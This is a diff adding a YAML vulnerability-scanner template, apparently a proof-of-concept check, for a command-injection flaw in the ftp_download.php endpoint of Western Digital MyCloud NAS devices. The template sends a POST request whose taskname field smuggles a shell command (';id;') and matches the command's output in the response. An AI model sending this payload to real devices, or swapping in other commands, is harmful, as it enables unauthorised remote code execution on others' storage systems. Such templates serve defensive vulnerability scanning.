@@ -1,0 +1,25 @@
+id: wd-nas-ftp-download-rce
+
+info:
+  name: 西部数码NAS-ftp_download.php接口存在命令执行漏洞
+  author: avic123
+  severity: critical
+  verified: true
+  description: |
+    Western Digital MyCloud NAS是一款网络附加存储设备,旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件,支持多种设备的备份和共享。西部数码NAS ftp_download.php接口存在命令执行漏洞
+  reference:
+    - https://mp.weixin.qq.com/s/P4g63IEhe-047Y7EjerKPg
+  tags: WD,nas,rce
+  created: 2025/08/21
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /web/addons/ftp_download.php
+      body: |
+        action=create&taskname=";id;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
+    expression: >-
+      response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.raw)
+
+expression: r0()
